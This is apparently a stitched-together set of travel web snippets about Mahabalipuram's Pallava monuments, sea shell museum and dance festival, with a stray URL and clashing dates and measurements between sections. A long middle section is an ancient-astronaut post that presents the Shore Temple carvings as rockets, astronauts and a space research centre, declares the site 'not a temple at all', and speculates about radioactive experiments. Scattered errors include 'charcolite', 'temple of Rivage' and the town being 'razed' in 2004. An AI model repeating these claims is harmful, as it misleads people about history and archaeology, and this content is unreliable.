The Shore Temple is Mammallapuram’s signature symbol. Made of charcolite, its silhouette is beautiful against the changing colours of the sky. The temple is said to be one of the seven that existed here in 600 CE. A 2002 diving expedition by the National Institute of Oceanography, India, and the Scientific Exploration Society, UK, found proof of this legend. Researchers discovered masonry and stone stuctures submerged 20 ft deep in the waters here. The only remaining Shore Temple is dedicated to Shiva with his consort Parvati and sons, Vinayaka and Karthikeya. Here too you will find the unique Sthala Shayana Perumal — the only temple in India where Vishnu reclines on the floor, serenaded by the sound of the waves. Pillars of the temple bear the evocative Pallava emblem of roaring lions. 
Entry fee: Indians ₹10, foreigners ₹250. Ticket issued for Shore Temple and 5 Rathas (valid one day only). Entry to all other monuments free Timings: 6 am to 6 pm, open all days 
Cameras: Still free, video ₹25 
Tip: Arm yourself with a travel book-cum-map or hire a guide.In the middle of the town is Arjuna’s Penance, the world’s largest bas-relief panel. Measuring 27m by 9m, this gargantuan rock has over a hundred carved figures of gods, men and beasts. It is slashed by a perpendicular fissure that has been creatively included in the depiction of Ganga’s descent to Earth. It’s named after Arjuna, the Pandava who is believed to have meditated here. On the right stands the lifelike Family of Monkeys, and a stone’s throw from here is Krishna’s Butterball, a boulder resting on the tip of a slope. Gravity defying.Where to Stay and Eat

Mahabalipuram is an ancient historic town and was a bustling seaport during the time of Periplus (1st century CE) and Ptolemy (140 CE). Ancient Indian traders who went to countries of South East Asia sailed from the seaport of Mahabalipuram. Today's Mahabalipuram is purely a tourist town and one of the major attractions around Chennai. People visit this place to see the magnificent rock carvings, temples, cave sanctuaries, giant open-air reliefs such as the famous 'Descent of the Ganges', and the temple of Rivage, with thousands of sculptures to the glory of Shiva.

It is famous for its shore temples built in 7th century. Mahabalipuram is one of the must visit weekend getaways from Chennai for one day trip. This also a major historical / heritage site in Tamil Nadu and one of the best places to experience Tamilnadu Tourism. Mahabalipuram is one of the best places to include in your Pondicherry tour packages. This UNESCO World Heritage Site was the second capital of the Pallava kings of Kanchipuram. It is an ancient historic town and was a bustling seaport during Pallava kings in 7th Century AD. According to the legend, it has been named after the demon king Mahabali who was renowned for his generosity. Some maintain that it has been named Mamallapuram after the Pallava King Narasimha Varman I, a great wrestler with the title Mamallan.It is known for its historical monuments, sculptures, scenic beauty, culture and tradition. Mahabalipuram art can be divided into four categories: open air bas-relief, structured temples, man-made caves and rathas (chariot temples). The famous Arjuna's Penance and the Krishna Mandapa adorn massive rocks near the centre of the village. The beautiful Shore Temple towers over the waves, behind a protective breakwater. Sixteen man-made caves in different stages of completion are also seen, scattered through the area. The striking feature is that all the sculptures here are monolithic - giant structures carved from single rocks.The temples of Mamallapuram, built largely during the reigns of Narasimha Varman and his successor Rajasimha Varman, showcase the movement from rock-cut architecture to structural buildings. The mandapas and the rathas shaped as temple chariots are made from the granite rock face, while the famed Shore Temple, erected half a century later, is built as a structured temple with huge blocks of rocks following wonderful architecture. Thirukadalmallai temple, Cholamadal Artist's Village, Mahabalipuram Beach, Tiger Cave and Crocodile Bank serve as popular picnic spots for people here.One of the prominent festivals celebrated here is the Mamallapuram Dance Festival, which is organized by the Department of Tourism every year during December - January. As part of the festival, various dance forms are showcased including Bharatanatyam, Kuchipudi, Kathakali and Odissi.The nearest airport to Mahabalipuram is in Chennai, located about 50 km away.

At a distance of 2 Kms from Mahabalipuram Bus Station, The Shore Temple (700-728 CE) is so named because it over looks the Bay of Bengal. It has been classified as a UNESCO World Heritage Site as part of 'Group of Monuments at Mahabalipuram'.Mahabalipuram Shore Temple is a structural temple, built with blocks of granite, dating from the 8th century AD. The site is famous for the rock-cut caves and the sculptured rock that line a granite hill. The temple was built by Pallavas during the reign of Narasimhavarman.The Shore Temple is a five-storeyed structural Hindu temple rather than rock-cut as are the other monuments at the site. It is the earliest important structural temple in Southern India. Its pyramidal structure is 60 ft high and sits on a 50 ft square platform. There is a small temple in front which was the original porch. It is made out of finely cut local granite.The Shore Temples has two Shiva shrines .....

At a distance of 0.5 Km from Mahabalipuram Bus Station (on Mada Koil Street), Arjuna's Penance or Bhagiratha's Penace is the name of a massive open air bas-relief monolith dating from the 7th century CE. Measuring 96 feet long by 43 feet high, the bas-relief is also known as The Descent of Ganga. It has been classified as a UNESCO World Heritage Site as part of 'Group of Monuments at Mahabalipuram'.In one interpretation, a figure in the bas-relief who is standing on one leg is said to be Arjuna performing an austerity Tapas to receive a boon from Shiva as an aid in fighting the Mahabharata war. The bas relief is situated on a rock with a cleft. Figures within the cleft are said to represent the River Ganges and Shiva. This provides the basis for an alternative interpretation, rather than Arjuna, the figure performing austerities is said to be Bhagiratha.

At a distance of 0.5 Kms around Mahabalipuram Bus Station, there are 14 rock-cut carves and Mandapams in and around Mamallapuram. Mythological scenes are depicted on these architectures. These caves have been classified as a UNESCO World Heritage Site as part of 'Group of Monuments at Mahabalipuram'.Following three are important Mandapams:1) Krishna Mandapam - This is the biggest among the Mandapams and is dedicated to Lord Krishna. The sculptures inside this Mandapam beautifully picturize the myth of Lord Krishna during his brave and energetic adulthood.2) Mahishasuramardhini Mandapam - The battle between goddess Durga and the buffalo headed demon, Mahishasura is beautifully inscribed.3) Varaha Mandapam - the side walls have large sculptured panels depicting Vishnu as Varaha, the boar, holding up Bhudevi, the earth goddess.

At a distance of 1.5 Kms from Mahabalipuram Bus Station, Pancha Rathas (Five Chariots) - five monolithic pyramidal structures named after the Pandavas (Arjuna, Bhima, Yudhishtra, Nakula and Sahadeva) and Draupadi. It has been classified as a UNESCO World Heritage Site as part of 'Group of Monuments at Mahabalipuram'.An interesting aspect of the rathas is that, despite their sizes they are not assembled - each of these is carved from one single large piece of stone. The Pancha Rathas shrines were carved during the reign of King Mahendravarman I and his son Narasimhavarman I. Each temple is a monolith, carved whole from a rock outcropping of pink granite.

http://www.greatholidayideas.net/weekend/near-chennai/sea-shells-museum,-mahabalipuram.html

The Sea Shells museum located in Mahabalipuram is a marvel. On display at this museum are more than 40000 pieces of shells from all over the world, making it Asia's largest sea shells museum. Fossils, shark teeth and whale fins are the other items of display. My favorites at this museum are the car, ship and train made out of oyster shells. While the collection itself is magnificent, the other noteworthy aspect of this museum is the fascinating story told here about how pears are formed in oysters. Sea food lovers would also love the sea food restaurant located inside the complex. Maya Bazaar is the other interesting aspect where one can shop for jewelry made out of pearls and sea shells.

While visiting Mahabalipuram in India which is famous for rock temples, we found some shocking depictions of rocket spacecrafts, astronauts and complex flying machines. These carvings were done in 7th and 8th century A.D , but show the existence of ancient flying machines. Let us take a look at some of them.


A rocket space craft at the center of the tower

A Rocket spacecraft, with a wide base and an a sharp aerodynamic top stands erect on the temple tower. Notice the similarity of the design to our modern day rockets sent into space. Remember that these carvings were done 1200 years ago, although we know that the first rocket spacecraft was launched only in 1957.


An ancient astronaut at the top of the tower with three antennas on his head

On the very top of the temple tower, is a humanoid figure adorned with three antennas. If it were only two antennas on the sides, we can easily dismiss it as a mythical figure with 2 horns. This looks similar to the alien astronauts of Nazca lines. to What is the need to put this figure at the very top? Is this in fact, an ancient astronaut flying into the space?


Multiple faces carved within circles, like vignette photographs in a museum

What are these faces carved on the temple? Even tour guides are at a loss to explain this, as they don't look like typical Hindu gods. The faces look eerily similar to the classic vignette photographs that you would find in an old building. Just like you would find photographs of people who helped build a building, these different faces are carved around this temple.


Vinayaka, The Elephant God was placed recently inside the chamber to prevent vandalism

But wait! This is a temple carved for a Hindu god. Why put an 8 foot Elephant God statue inside the temple if this is all about ancient astronauts? Right? Wrong! The statue of the Hindu god was placed inside the structure less than 50 years ago! No one knows what was originally inside. In recent times, it has become a common practice in India to put a God's statue to prevent vandalism. So, it makes sense why the statue was places inside: people would keep away from destroying the carvings. In fact, none of the caves here have had a primary statue of a God (called moolavar) inside. This is distinctly different from other caves like Ellora, found in India.


Above: Another chamber has no carvings or signs of any statue installation, just a raised rock platform

For further proof that Mahabalipuram was not built for religious purposes, look into another chamber in the nearby tower. What is there? Nothing! No carvings, no sign of any existence of statues installed, ever. Only a flat rock bed. What could have been inside 1200 years ago? Were they used for experimenting with explosive or radioactive material? This is a possibility, as the rock caves would protect and prevent others from getting hurt. If an air tight steel door was installed in the doorway, it could still be used for many scientific experiments.


On a side note, archaeologists agree that Machu Picchu is not a temple, either. Do these enormous stone structures found all over the world have some other valuable reason? Was it done by thousands of sculptors on such astounding magnitude just to kill time?


Face of the Tamil King Narasimhavarman, carved in Mahabalipuram

Now, let us go back to the faces for a minute. Look at this face: it looks like the Indian King who built the temple. He wears a crown and you can also see his right ear ring.


Two faces carved within circles, one resembling African and the other, European

What about these two faces? Are these humans or aliens? The one on the left is a side view of a face. Is it human? If so, look at the significantly larger nose and bigger lips? Could it be a depiction of an African king? What about the face on the right? Since it resembles a Caucasian face,  could it be the Roman King Heraclius? Was the world better connected 1200 years ago? Or are these faces of "Heavenly Gods" capable of flight, mentioned in ancient texts?


A modern day vignette of George Washington, as seen in a museum 

Now, think about a modern day building, where you find (vignette) photographs of founders and patrons who helped to build it. Were these carvings done to give credit to the people who helped the ancient astronauts?


The entire structure which is mistakenly thought of as temple by tourists and locals.

Now that we know it is not a temple at all, look at the entire structure. Is it a depiction of an elaborate space research center like NASA? The security system is depicted by two strong men with weapons on either side of the entrance. They are called "Dwarapalakas" literally meaning "Protectors of the gateway". Gateway to what?


The upper half of the tower shows complex aerodynamic structures

As you go from the bottom to the top, you can see multiple aerodynamic structures, probably propulsion devices that support the final spaceship on top. This complex engineering design reminds us of the alien tools in Nazca lines.


Four Fire Breathing Lions in a row, shouldn't the fire go up when they breathe? 

There are many distinct sculptures of fire breathing lions, all over the stone towers. These lions are not to be confused with Yali, the mythical Hindu creature found in shrines like the Madurai Meenakshi Temple. Why are there so many faces of lions and why are they all breathing fires? If in fact, they are breathing fire, why is the fire going down, instead of going up?



A closeup of a fire breathing lion's face - Do you see two astronauts facing each other?

Let us ignore the fire and look closely at the face of the lion. Is it a face of the lion, or  do you see two people facing each other? These two humanoids are wearing helmets and are enclosed tightly in a pod. Their facial features are not visible, because they would be wearing glass visers, similar to a modern day astronaut. They also wear a complete body suit which has 2 small projections resembling pincers.


A modern day astronaut - The visor would conceal his face, just as seen in the carvings


Take a look at the modern day astronaut's visor. If a modern day sculptor were to carve this, how would he show the facial features?


Four Ancient Spacecrafts blasting off - Fire at the bottom, while smoke and dust rises up!

Now, let us go back to the "fire breathing lions". Now, do you see 4 spacecrafts blasting off, carrying 2 astronauts each? During the launching, there would be a massive fire below the spacecraft and smoke would rise up, which is also accurately shown in the sculptures. Doesn't this make more sense than fire breathing lions?

Is this enough evidence to prove that ancient astronauts were depicted in the rocks and caves of Mahabalipuram? After all, there are thousands of sculptures in the area and we have only seen a few of them.  Should n't there be more carvings about spacecrafts and astronauts? Yes! I will be posting more evidence here in a few days.

	Inspired? Head to this ancient town for the annual Mamallapuram Dance Festival, one of the most vivacious festival celebrations in India. A tribute to the legacy of elegant Indian dance forms, the venue for the event is the World Heritage Site, popularly known as Arjuna’s Penance. Here, you will get to see the enormous bas-relief (a sculptural relief) sculpted on two massive monoliths. While the imposing sculpture, depicting the descent of the Ganges from the heavens at the request of King Bhagirath, is in itself worth a visit, the dance festival of Mamallapuram adds allure to the journey.
	Get your mudras and eye movements right, as you follow graceful dancers performing the majestic Bharatanatyam and Kuchipudi dances or enacting the romantic tales of Radha and Krishna through the delicate hand movements of the Manipuri dance form. Kathak – the dance form that was once under the patronage of the Nawabs of Avadh – competes with the stately bhangas (stance) of Odissi, while other Indian dances like Mohini Attam and the expressive Kathakali beckon you. What makes the festival even more interesting is that here you not only get to see the traditional Indian dances but also some rare folk dance forms like Karagam, Kavadi and Kokkali Attam.  The brilliant confluence of international and Indian dance and Indian traditional music can be witnessed at the open-air auditorium at the dance festival in Mamallapuram.  
	Toss in some sea, sunshine, seafood, a bunch of sunburnt tourists and a lot of shops selling little knickknacks on the shore, and you have Mamallapuram, a year-round affordable destination and a backpacker’s dream come true. This ancient port city is just a couple of hours from Chennai and attracts hundreds of shoe-string holidaymakers throughout the four weeks of the festival. Razed to the ground in the 2004 Indian Ocean tsunami; Mamallapuram has bounced back with élan to once again host India’s definitive dance extravaganza. While here, you might also want to visit the Shore Temple - the earliest known stone temple in South India. The city is famous for its stone cut structures, including Krishna’s Butterball, Mahishamardini Cave and the Varaha Cave - impressive monuments that have stood the test of time. You can also learn the art of stone carving from one of the many stone carvers who sit on the main street leading to the sea.
